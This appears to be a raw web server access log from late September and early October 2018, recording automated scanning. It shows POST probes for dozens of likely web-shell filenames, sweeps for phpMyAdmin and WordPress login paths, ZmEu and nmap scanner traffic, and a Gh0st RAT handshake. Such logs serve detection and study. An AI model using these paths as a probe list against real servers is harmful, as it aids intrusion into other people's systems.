"94.191.25.26","01/Oct/2018","POST","/test.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/caonma.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/ss.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/wcp.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/u.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/uuu.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/sss.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/1.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/2.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/core.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/qaz.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/sha.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/ppx.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/1.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/confg.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/conf1g.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/ver.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/hack.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/qa.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/Ss.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/xxx.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/92.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/z.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/x.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/nuoxi.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/godkey.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/okokok.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/erwa.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/pma.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/ruyi.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/51314.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/5201314.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/fusheng.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/general.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/repeat.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/ldw.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/api.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/s1.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/xiaodai.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/hello.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/xp.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/1.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/2.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/p.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/1.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/a.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/m.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/conf.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/123.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/HX.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/diy.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/666.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/777.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/qwq.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/xiaoma.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/xiaomae.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/xiaomar.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/qq.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/data.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/log.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/fack.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","POST","/angge.php","Trident/6.0)"

"94.191.25.26","01/Oct/2018","GET","/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpmyadmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpMyAdmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/pmd/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/PMA/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/PMA2/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/pmamy/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/pmamy2/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/mysql/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/admin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/db/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/dbadmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/web/phpMyAdmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/admin/pma/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/admin/PMA/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/admin/mysql/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/admin/mysql2/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/admin/phpmyadmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/admin/phpMyAdmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/admin/phpmyadmin2/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/mysqladmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/mysql-admin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpadmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpAdmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpmyadmin0/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpmyadmin1/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpmyadmin2/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpMyAdmin-4.4.0/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/myadmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/myadmin2/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/xampp/phpmyadmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpMyadmin_bak/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/www/phpMyAdmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/tools/phpMyAdmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpmyadmin-old/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpMyAdminold/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpMyAdmin.old/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/pma-old/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/claroline/phpMyAdmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/typo3/phpmyadmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpma/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpmyadmin/phpmyadmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpMyAdmin/phpMyAdmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpMyAbmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpMyAdmin__/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpMyAdmin+++---/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/v/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpmyadm1n/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpMyAdm1n/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/shaAdmin/index.php","Firefox/48.0"

"94.191.25.26","01/Oct/2018","GET","/phpMyAdmion/index.php","Firefox/48.0"

"139.162.106.181","01/Oct/2018","GET","/",""Go-http-client/1.1"

"193.106.31.98","01/Oct/2018","GET","/","zgrab/0.x"

"185.247.62.56","01/Oct/2018","GET","/","5"

"185.247.62.56","01/Oct/2018","POST","/sdk","https://nmap.org/book/nse.html)"

"185.247.62.56","01/Oct/2018","GET","/",""-"

"185.247.62.56","01/Oct/2018","GET","/nmaplowercheck1538392011","https://nmap.org/book/nse.html)"

"185.247.62.56","01/Oct/2018","GET","/",""-"

"185.247.62.56","01/Oct/2018","GET","/HNAP1","https://nmap.org/book/nse.html)"

"185.156.177.81","01/Oct/2018","\x03"","400",""-"

"34.215.142.111","01/Oct/2018","HEAD","/","Safari/537.36"

"34.215.142.111","01/Oct/2018","GET","/","Wappalyzer)"

"34.215.142.111","01/Oct/2018","HEAD","/","Safari/537.36"

"34.215.142.111","01/Oct/2018","GET","/","Safari/537.36"

"213.145.134.164","29/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"208.80.194.30","29/Sep/2018","GET","/Jogos/app/tutorial.pdf","Safari/534.50"

"213.145.134.164","29/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"201.182.198.89","29/Sep/2018","GET","/","Safari/537.36"

"100.43.90.119","29/Sep/2018","GET","/robots.txt","+http://yandex.com/bots)"

"100.43.90.119","29/Sep/2018","GET","/","+http://yandex.com/bots)"

"213.33.185.22","29/Sep/2018","GET","/","Safari/537.36"

"186.219.250.179","29/Sep/2018","GET","/","Safari/537.36"

"60.191.38.77","29/Sep/2018","GET","/","Firefox/47.0"

"185.234.217.187","29/Sep/2018","GET","/wp-login.php","Trident/5.0)"

"188.231.191.7","29/Sep/2018","GET","/","Safari/537.36"

"180.249.240.49","29/Sep/2018","GET","/","Safari/601.7.7"

"185.211.71.13","29/Sep/2018","GET","/","Safari/537.36"

"203.113.174.8","29/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"203.113.174.8","29/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"14.34.148.34","29/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"14.34.148.34","29/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"200.29.191.76","29/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"200.29.191.76","29/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"74.50.210.132","29/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"74.50.210.132","29/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"141.8.144.26","29/Sep/2018","GET","/robots.txt","+http://yandex.com/bots)"

"100.43.90.119","29/Sep/2018","GET","/","+http://yandex.com/bots)"

"91.234.154.204","29/Sep/2018","GET","/","Safari/537.36"

"139.199.248.209","29/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"139.199.248.209","29/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"193.106.31.98","29/Sep/2018","GET","/","zgrab/0.x"

"184.154.139.49","29/Sep/2018","GET","/","Trident/6.0)"

"184.154.139.49","29/Sep/2018","GET","/","Trident/6.0)"

"184.154.139.49","29/Sep/2018","GET","/th1s_1s_a_4o4.html","Trident/6.0)"

"184.154.139.49","29/Sep/2018","GET","/index.html",";Nav)"

"184.154.139.49","29/Sep/2018","GET","/index.html","Trident/6.0)"

"100.43.90.119","29/Sep/2018","GET","/robots.txt","+http://yandex.com/bots)"

"100.43.90.119","29/Sep/2018","GET","/","+http://yandex.com/bots)"

"5.8.54.27","29/Sep/2018","GET","/?XDEBUG_SESSION_START=phpstorm","Safari/537.36"

"37.59.44.43","29/Sep/2018","GET","/wp-login.php","Safari/537.36"

"37.59.44.43","29/Sep/2018","GET","/robots.txt","Safari/537.36"

"111.231.236.170","29/Sep/2018","GET","/",""-"

"66.240.205.34","29/Sep/2018","Gh0st\xad"","400",""-"

"66.249.75.71","29/Sep/2018","GET","/robots.txt","+http://www.google.com/bot.html)"

"66.249.75.71","29/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"91.239.137.17","29/Sep/2018","GET","/","Safari/537.36"

"66.249.75.39","29/Sep/2018","GET","/robots.txt","+http://www.google.com/bot.html)"

"66.249.75.35","29/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"180.76.15.144","29/Sep/2018","GET","/","+http://www.baidu.com/search/spider.html)"

"80.90.129.94","29/Sep/2018","GET","/","Safari/601.7.7"

"201.43.48.165","29/Sep/2018","GET","/","Safari/537.36"

"45.40.196.55","29/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"45.40.196.55","29/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"66.249.75.200","29/Sep/2018","GET","/robots.txt","+http://www.google.com/bot.html)"

"66.249.75.198","29/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"116.196.115.63","29/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"116.196.115.63","29/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"77.76.205.132","29/Sep/2018","GET","/console","Firefox/57.0"

"77.76.205.132","29/Sep/2018","GET","/phpMyAdmin/scripts/setup.php","Firefox/57.0"

"77.76.205.132","29/Sep/2018","GET","/phpmyadmin/scripts/setup.php","Firefox/57.0"

"77.76.205.132","29/Sep/2018","GET","/scripts/setup.php","Firefox/57.0"

"77.76.205.132","29/Sep/2018","GET","/pma/scripts/setup.php","Firefox/57.0"

"77.76.205.132","29/Sep/2018","GET","/","Firefox/57.0"

"212.33.32.184","29/Sep/2018","GET","/console","Firefox/57.0"

"212.33.32.184","29/Sep/2018","GET","/phpMyAdmin/scripts/setup.php","Firefox/57.0"

"212.33.32.184","29/Sep/2018","GET","/phpmyadmin/scripts/setup.php","Firefox/57.0"

"212.33.32.184","29/Sep/2018","GET","/scripts/setup.php","Firefox/57.0"

"212.33.32.184","29/Sep/2018","GET","/pma/scripts/setup.php","Firefox/57.0"

"212.33.32.184","29/Sep/2018","GET","/","Firefox/57.0"

"189.110.172.2","29/Sep/2018","GET","/","Safari/537.36"

"104.168.151.140","29/Sep/2018","HEAD","/static/admin/images/login_logo.png","Safari/537.36"

"104.168.151.140","29/Sep/2018","HEAD","/static/admin/images/login_logo.png","Safari/537.36"

"104.168.151.140","29/Sep/2018","HEAD","/static/admin/images/login_logo.png","Safari/537.36"

"104.168.151.140","29/Sep/2018","HEAD","/static/admin/images/login_logo.png","Safari/537.36"

"139.162.106.181","29/Sep/2018","GET","/",""Go-http-client/1.1"

"191.243.55.91","29/Sep/2018","GET","/","Safari/601.7.7"

"221.217.53.201","29/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"221.217.53.201","29/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"201.150.149.60","29/Sep/2018","GET","/","Safari/537.36"

"46.252.37.106","29/Sep/2018","GET","/","Safari/537.36"

"60.191.38.77","29/Sep/2018","GET","/","Firefox/47.0"

"185.220.101.32","29/Sep/2018","GET","/","Safari/537.36"

"185.10.68.233","29/Sep/2018","GET","/","scans."

"188.165.254.65","29/Sep/2018","GET","/wp-login.php","Safari/537.36"

"188.165.254.65","29/Sep/2018","GET","/robots.txt","Safari/537.36"

"66.249.75.71","29/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"34.241.180.166","29/Sep/2018","GET","/","aiohttp/2.3.2"

"184.22.235.161","29/Sep/2018","GET","/","Safari/537.36"

"198.143.155.139","30/Sep/2018","GET","/","Safari/537.36"

"210.94.133.248","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"210.94.133.248","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"159.146.27.185","30/Sep/2018","GET","/","Safari/537.36"

"107.170.204.138","30/Sep/2018","GET","/","zgrab/0.x"

"144.76.3.79","30/Sep/2018","GET","/robots.txt","http://mj12bot.com/)"

"144.76.3.79","30/Sep/2018","GET","/","http://mj12bot.com/)"

"78.46.176.21","30/Sep/2018","GET","/robots.txt","http://mj12bot.com/)"

"78.46.176.21","30/Sep/2018","GET","/","http://mj12bot.com/)"

"208.80.194.28","30/Sep/2018","GET","/Jogos/app/tutorial.pdf","Firefox/3.6.7"

"47.74.0.246","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"47.74.0.246","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"112.210.182.211","30/Sep/2018","GET","/","Safari/537.36"

"159.226.20.33","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"159.226.20.33","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"93.41.144.184","30/Sep/2018","GET","/",""-"

"66.249.75.71","30/Sep/2018","GET","/robots.txt","+http://www.google.com/bot.html)"

"66.249.75.71","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"180.76.15.12","30/Sep/2018","GET","/robots.txt","Firefox/6.0.2"

"180.76.15.146","30/Sep/2018","GET","/robots.txt","Firefox/6.0.2"

"180.76.15.161","30/Sep/2018","GET","/","+http://www.baidu.com/search/spider.html)"

"146.88.74.158","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"146.88.74.158","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"188.165.197.221","30/Sep/2018","GET","/wp-login.php","Safari/537.36"

"188.165.197.221","30/Sep/2018","GET","/robots.txt","Safari/537.36"

"218.241.251.155","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"218.241.251.155","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"23.92.127.2","30/Sep/2018","GET","/wp-login.php","GTB5"

"23.92.127.2","30/Sep/2018","GET","/blog/wp-login.php","GTB5"

"23.92.127.2","30/Sep/2018","GET","/wp/wp-login.php","GTB5"

"23.92.127.2","30/Sep/2018","GET","/wordpress/wp-login.php","GTB5"

"23.92.127.2","30/Sep/2018","GET","/wp-login.php","GTB5"

"23.92.127.2","30/Sep/2018","GET","/wp-login.php","GTB5"

"23.92.127.2","30/Sep/2018","GET","/wp-login.php","GTB5"

"159.89.142.172","30/Sep/2018","GET","/w00tw00t.at.blackhats.romanian.anti-sec:)",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/phpmadmin/scripts/setup.php",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/phpMyAdmin/scripts/setup.php",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/mysqladmin/scripts/setup.php",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/PMA2012/",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/pma2012/",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/PMA2011/",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/pma2011/",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/phpmyadmin2/",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/phpmyadmin3/",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/phpmyadmin4/",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/pma/scripts/setup.php",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/myadmin/scripts/setup.php",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/MyAdmin/scripts/setup.php",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/mysql/scripts/setup.php",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/phpMyAdmin-2.10.0.0/scripts/setup.php",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/phpMyAdmin-2.11.11/scripts/setup.php",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/phpMyAdmin-2.11.11.3/scripts/setup.php",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/phpMyAdmin-3.0.0.0-adll-languages/scripts/setup.php",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/dbadmin/scripts/setup.php",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/db/scripts/setup.php",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/scripts/setup.php",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/phpMyAdmin-2/scripts/setup.php",""ZmEu"

"159.89.142.172","30/Sep/2018","GET","/mysql/",""ZmEu"

"127.0.0.1","30/Sep/2018","OPTIONS","*","connection)"

"127.0.0.1","30/Sep/2018","OPTIONS","*","connection)"

"66.249.75.39","30/Sep/2018","GET","/robots.txt","+http://www.google.com/bot.html)"

"66.249.75.39","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"46.231.155.65","30/Sep/2018","POST","/blog/xmlrpc.php","Firefox/3.6.8"

"46.231.155.65","30/Sep/2018","POST","/xmlrpc.php","Firefox/3.6.8"

